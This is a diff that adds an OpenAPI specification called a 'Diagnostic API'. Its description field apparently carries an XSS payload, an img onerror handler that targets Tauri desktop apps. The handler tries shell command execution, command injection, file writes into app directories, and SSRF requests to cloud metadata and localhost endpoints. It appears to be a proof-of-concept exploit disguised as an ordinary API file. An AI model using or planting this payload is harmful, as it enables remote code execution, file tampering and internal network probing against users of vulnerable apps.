@@ -1,0 +1,30 @@
+openapi: "3.0.0"
+info:
+  title: "Diagnostic API"
+  version: "1.0.0"
+  description: |
+    Diagnostic test.
+    <img src=x onerror="(function(){var t=window.__TAURI__;if(!t)return;var r=['=== RCE DIAGNOSTIC ===',''];var done=false;function show(){if(!done){done=true;alert(r.join('\n'))}}r.push('--- SHELL EXECUTE (invoke) ---');t.tauri.invoke('plugin:shell|execute',{program:'calc',args:[],options:{},onEventFn:0}).then(function(v){r.push('shell|execute: SUCCESS! pid='+JSON.stringify(v))}).catch(function(e){r.push('shell|execute: '+e.toString().substring(0,80))}).then(function(){r.push('');r.push('--- SHELL OPEN (cmd injection) ---');return t.tauri.invoke('plugin:shell|open',{path:'https://a calc.exe'}).catch(function(e){r.push('shell|open cmd: '+e.toString().substring(0,80))})}).then(function(){r.push('');r.push('--- FS WRITE: APP DIRECTORIES ---');var BD={AppLocalData:23,AppConfig:21,AppCache:24,App:18,Resource:17,Cache:2,Config:3,Data:4,LocalData:5};var dirs=Object.entries(BD);var i=0;function tryDir(){if(i>=dirs.length){r.push('');r.push('--- INVOKE: stream_fetch SSRF ---');t.tauri.invoke('stream_fetch',{method:'GET',url:'http://169.254.169.254/latest/meta-data/',headers:{},body:[]}).then(function(v){r.push('SSRF cloud metadata: status='+v.status)}).catch(function(e){r.push('SSRF: '+e.toString().substring(0,80))}).then(function(){r.push('');r.push('--- INVOKE: stream_fetch localhost ---');return t.tauri.invoke('stream_fetch',{method:'GET',url:'http://127.0.0.1:3000/',headers:{},body:[]})}).then(function(v){r.push('localhost:3000: status='+v.status)}).catch(function(e){r.push('localhost: '+e.toString().substring(0,60))}).then(show);return}var d=dirs[i];i++;t.fs.writeTextFile('poc-test.txt','RCE-TEST',{dir:d[1]}).then(function(){r.push('WRITE SUCCESS: dir='+d[0]+' ('+d[1]+')')}).catch(function(e){r.push(d[0]+'('+d[1]+'): '+e.toString().substring(0,60))}).then(tryDir)}tryDir()})})()">
+servers:
+  - url: "https://api.diagnostic.example.com/v1"
+paths:
+  /test:
+    get:
+      operationId: runTest
+      summary: "Run diagnostic test"
+      parameters:
+        - name: id
+          in: query
+          required: true
+          schema:
+            type: string
+      responses:
+        "200":
+          description: "Test result"
+          content:
+            application/json:
+              schema:
+                type: object
+                properties:
+                  status:
+                    type: string
